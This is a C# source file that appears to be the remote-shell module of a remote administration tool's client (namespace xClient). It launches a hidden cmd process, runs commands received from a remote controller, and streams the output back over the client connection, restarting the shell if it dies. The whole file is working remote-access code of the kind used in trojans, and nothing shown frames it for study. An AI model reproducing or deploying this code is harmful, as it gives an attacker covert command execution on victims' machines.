using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace xClient.Core.RemoteShell
{
    public class Shell : IDisposable
    {
        private Process _prc;
        private bool _read;

        // This ManualResetEvent will signal when we are allowed to read the standard
        // error output stream from the shell (after we are done reading the standard
        // output). Reading the standard output and the standard error output at the
        // same time will cause a deadlock.
        private ManualResetEvent _redirectStandardOutputEvent;
        private ManualResetEvent _redirectStandardErrorEvent;

        private void CreateSession()
        {
            _read = true;
            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = "/K"
                }
            };

            _prc.Start();
            
            // Fire up the logic to redirect the outputs and handle them.
            RedirectOutputs();

            Thread.Sleep(100);

            new Packets.ClientPackets.DoShellExecuteResponse(">> New Session created" + Environment.NewLine).Execute(
                Program.ConnectClient);
        }

        /// <summary>
        /// Sets or resets all ManualResetEvents needed to 
        /// </summary>
        private void InitializeResetEvents()
        {
            if (_redirectStandardOutputEvent != null)
                _redirectStandardOutputEvent.Close();
            
            _redirectStandardOutputEvent = new ManualResetEvent(false);

            if (_redirectStandardErrorEvent != null)
                _redirectStandardErrorEvent.Close();

            _redirectStandardErrorEvent = new ManualResetEvent(true);
        }

        private void RedirectOutputs()
        {
            InitializeResetEvents();

            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardOutput(); });
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardError(); });
        }

        private void RedirectStandardOutput()
        {
            try
            {
                using (var reader = _prc.StandardOutput)
                {
                    while (!reader.EndOfStream && _read)
                    {
                        if (_redirectStandardErrorEvent == null)
                            return;

                        // If we are reading the standard error output, just wait.
                        _redirectStandardErrorEvent.WaitOne();
                        _redirectStandardOutputEvent.Set();

                        var read = reader.ReadLine();
                        if (!string.IsNullOrEmpty(read))
                        {
                            new Packets.ClientPackets.DoShellExecuteResponse(read + Environment.NewLine).Execute(
                                Program.ConnectClient);
                        }

                        _redirectStandardOutputEvent.Reset();
                    }
                }

                if ((_prc == null || _prc.HasExited) && _read)
                    throw new ApplicationException("session unexpectedly closed");
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    new Packets.ClientPackets.DoShellExecuteResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
                        .Execute(Program.ConnectClient);

                    CreateSession();
                }
            }
        }

        private void RedirectStandardError()
        {
            try
            {
                using (var reader = _prc.StandardError)
                {
                    while (!reader.EndOfStream && _read)
                    {
                        if (_redirectStandardErrorEvent == null)
                            return;

                        _redirectStandardOutputEvent.WaitOne();
                        _redirectStandardErrorEvent.Reset();

                        var read = reader.ReadLine();
                        if (!string.IsNullOrEmpty(read))
                        {
                            new Packets.ClientPackets.DoShellExecuteResponse(read + Environment.NewLine, true).Execute(
                                Program.ConnectClient);
                        }

                        _redirectStandardErrorEvent.Set();
                    }
                }

                if ((_prc == null || _prc.HasExited) && _read)
                    throw new ApplicationException("session unexpectedly closed");
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    new Packets.ClientPackets.DoShellExecuteResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
                        .Execute(Program.ConnectClient);

                    CreateSession();
                }
            }
        }

        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
                CreateSession();

            if (_prc == null) return false;

            _prc.StandardInput.WriteLine(command);
            _prc.StandardInput.Flush();

            return true;
        }

        public Shell()
        {
            CreateSession();
        }

        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _read = false;

                try
                {
                    if (_prc != null)
                    {
                        if (!_prc.HasExited)
                        {
                            try
                            {
                                _prc.Kill();
                            }
                            catch
                            { }
                        }
                        _prc.Dispose();
                        _prc = null;
                    }
                }
                catch
                { }
                finally
                {
                    if (_redirectStandardOutputEvent != null)
                    {
                        _redirectStandardOutputEvent.Close();
                    }
                    if (_redirectStandardErrorEvent != null)
                    {
                        _redirectStandardErrorEvent.Close();
                    }
                }
            }
        }
    }
}